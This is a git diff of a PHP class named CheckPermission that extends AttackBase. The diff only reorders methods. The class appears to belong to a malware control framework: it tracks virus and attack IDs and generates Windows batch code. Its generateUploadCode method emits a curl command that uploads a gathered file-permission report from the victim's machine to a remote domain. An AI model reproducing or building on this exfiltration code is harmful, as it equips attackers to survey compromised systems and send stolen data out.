@@ -22,16 +22,6 @@ class CheckPermission extends AttackBase {
 
     private array $directories = [];
 
-    public function setDirectories($blockDirectories) {
-        $directories = filter(explode("\n", $blockDirectories), function ($line) {
-            return !empty(trim($line));
-        });
-        $this->directories = [];
-        foreach ($directories as $directory) {
-            $this->directories[] = array("path" => $directory, "perm" => -1);
-        }
-    }
-
     public function setPermissions($blockResult) {
         $lines = filter(explode("\n", $blockResult), function ($line) {
             return !(empty(trim($line)) || trim($line) == ".");
@@ -62,21 +52,14 @@ class CheckPermission extends AttackBase {
         });
     }
 
-    protected function setState(string $json): void {
-        $state = json_decode($json, true);
-        $this->directories = $state["directories"];
-    }
-
-    protected function getState(): string {
-        $state = [];
-        $state["directories"] = $this->directories;
-        return json_encode($state);
-    }
-
-    private function generateUploadCode(): string {
-        ob_start(); ?>
-        curl --form "permFile=@%~pd0perm" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
-        <?php return ob_get_clean();
+    public function setDirectories($blockDirectories) {
+        $directories = filter(explode("\n", $blockDirectories), function ($line) {
+            return !empty(trim($line));
+        });
+        $this->directories = [];
+        foreach ($directories as $directory) {
+            $this->directories[] = array("path" => $directory, "perm" => -1);
+        }
     }
 
     public function generateBatchCode(): string {
@@ -102,6 +85,23 @@ class CheckPermission extends AttackBase {
         return ob_get_clean(); //@formatter:on
     }
 
+    private function generateUploadCode(): string {
+        ob_start(); ?>
+        curl --form "permFile=@%~pd0perm" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
+        <?php return ob_get_clean();
+    }
+
     public function processExtras(string $resourceIdentifier): void {
+    }
+
+    protected function setState(string $json): void {
+        $state = json_decode($json, true);
+        $this->directories = $state["directories"];
+    }
+
+    protected function getState(): string {
+        $state = [];
+        $state["directories"] = $this->directories;
+        return json_encode($state);
     }
 }
